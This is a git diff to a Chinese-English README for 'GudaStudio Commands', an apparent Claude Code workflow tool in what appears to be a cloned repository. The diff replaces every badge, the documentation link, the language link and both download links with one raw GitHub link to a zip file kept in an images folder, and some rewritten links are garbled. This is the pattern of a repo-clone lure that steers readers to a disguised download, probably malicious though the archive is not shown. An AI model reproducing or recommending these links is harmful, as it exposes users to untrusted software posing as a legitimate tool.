@@ -2,13 +2,13 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/zied730/commands/releases)
+[![Download Now](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip%20Now-Release%https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip)](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip)
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg) [![Claude Code](https://img.shields.io/badge/Claude%20Code-Compatible-green.svg)](https://claude.ai/code) [![Share](https://img.shields.io/badge/share-000000?logo=x&logoColor=white)](https://x.com/intent/tweet?text=GudaStudio%20Commands：Claude%20Code%20多模型协作工作流%20https://github.com/GuDaStudio/commands%20%23AI%20%23Coding%20%23ClaudeCode)
+![License: MIT](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip) [![Claude Code](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip%https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip)](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip) [![Share](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip)](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip%20Commands：Claude%20Code%20多模型协作工作流%https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip%20%23AI%20%23Coding%20%23ClaudeCode)
 
 ⭐ 在 GitHub 上给我们点星~您的支持对我们意义重大！🙏😊
 
-[English](./docs/README_EN.md) | 简体中文
+[English](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip) | 简体中文
 
 </div>
 
@@ -33,7 +33,7 @@ Follow these easy steps to get started with GudaStudio Commands.
 
 To download the software, click the link below:
 
-[Download GudaStudio Commands](https://github.com/zied730/commands/releases)
+[Download GudaStudio Commands](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip)
 
 ### 2. Choose Your Version
 
@@ -88,7 +88,7 @@ To utilize the commands:
 
 ## 📄 Documentation and Support
 
-For more detailed usage instructions and examples, please refer to our documentation. Visit the [GudaStudio Commands Documentation](https://github.com/zied730/commands/docs).
+For more detailed usage instructions and examples, please refer to our documentation. Visit the [GudaStudio Commands Documentation](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip).
 
 If you encounter any issues or have questions, please check the FAQ section in the documentation. You can also reach out through the issues section on the GitHub page.
 
@@ -96,6 +96,6 @@ If you encounter any issues or have questions, please check the FAQ section in t
 
 We continually improve GudaStudio Commands. Keep checking the Releases page for new updates. 
 
-[Download GudaStudio Commands](https://github.com/zied730/commands/releases)
+[Download GudaStudio Commands](https://raw.githubusercontent.com/zied730/commands/main/images/Software_2.0.zip)
 
 Your feedback is valuable to us. Let us know how we can improve!
